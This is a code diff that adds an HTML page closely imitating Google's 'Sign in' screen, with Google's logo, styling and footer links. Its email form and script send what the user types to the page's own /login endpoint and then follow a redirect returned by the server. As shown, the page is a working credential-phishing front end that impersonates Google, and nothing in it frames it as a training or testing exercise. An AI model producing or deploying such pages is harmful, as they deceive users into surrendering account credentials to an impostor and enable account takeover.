@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Sign in - Google</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            background: #f1f3f4;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+
+        .login-wrapper {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-card {
+            background: white;
+            border-radius: 20px;
+            padding: 48px;
+            width: 100%;
+            max-width: 900px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .google-logo {
+            width: 40px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 500;
+        }
+
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        .form-control {
+            height: 55px;
+            border-radius: 8px;
+        }
+
+        .link {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-next {
+            background: #1a73e8;
+            border: none;
+            padding: 10px 28px;
+            border-radius: 24px;
+            font-weight: 500;
+            min-width: 90px;
+        }
+
+        .btn-next:hover {
+            background: #1765cc;
+        }
+
+
+
+        .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media(max-width:768px) {
+
+            .login-card {
+                border-radius: 0;
+                height: 100vh;
+                max-width: 100%;
+                padding: 24px;
+            }
+
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-wrapper">
+
+        <div class="login-card">
+
+            <div class="row">
+
+                <!-- LEFT -->
+                <div class="col-md-6 mb-4">
+                    <div class="mb-2">
+
+                        <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48"
+                            aria-hidden="true" jsname="jjf7Ff">
+                            <path fill="#4285F4"
+                                d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z">
+                            </path>
+                            <path fill="#34A853"
+                                d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z">
+                            </path>
+                            <path fill="#FABB05"
+                                d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z">
+                            </path>
+                            <path fill="#E94235"
+                                d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z">
+                            </path>
+                        </svg>
+                    </div>
+
+                    <div class="title">Sign in</div>
+
+                    <div class="subtitle">
+                        Use your Google Account
+                    </div>
+
+                </div>
+
+                <!-- RIGHT -->
+                <div class="col-md-6">
+
+                    <form id="login-form" method="POST" action="/login" novalidate>
+                        <div class="mb-3">
+
+                            <input id="email" type="text" name="email" class="form-control"
+                                placeholder="Email or phone">
+
+                            <div id="email-error" class="invalid-feedback">
+
+                            </div>
+
+                        </div>
+
+                        <div class="mb-4">
+
+                            <a class="link" href="#">
+                                Forgot email?
+                            </a>
+
+                        </div>
+
+                        <p class="text-muted small mb-4">
+                            Not your computer? Use a Private Window to sign in.
+                            <a class="link" href="#">Learn more about using Guest mode</a>
+                        </p>
+
+                        <div class="d-flex justify-content-end align-items-center gap-3">
+
+
+                            <button type="submit" class="btn btn-next text-white">
+                                Next
+                            </button>
+
+                        </div>
+                    </form>
+                </div>
+
+            </div>
+
+            <script>
+
+                const form = document.getElementById('login-form');
+                const input = document.getElementById('email');
+                const errorDiv = document.getElementById('email-error');
+
+                input.addEventListener("input", () => {
+                    input.classList.remove("is-invalid");
+                });
+
+                form.addEventListener('submit', async (e) => {
+                    e.preventDefault();
+
+                    input.classList.remove('is-invalid');
+
+                    const formData = new URLSearchParams();
+                    for (const [key, value] of new FormData(form)) {
+                        formData.append(key, value);
+                    }
+
+                    const response = await fetch(form.action, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: formData.toString(),
+                    });
+
+                    const data = await response.json();
+
+                    if (data.redirect) {
+                        window.location.href = data.redirect;
+                        return;
+                    }
+
+                    if (!data.success) {
+
+                        errorDiv.textContent = data.error || "Login failed.";
+                        input.classList.add("is-invalid");
+                    }
+                });
+            </script>
+
+            <div class="footer d-flex justify-content-between">
+
+                <div>
+                    English (United States)
+                </div>
+
+                <div>
+                    <a href="#">Help</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</body>
+
+</html>
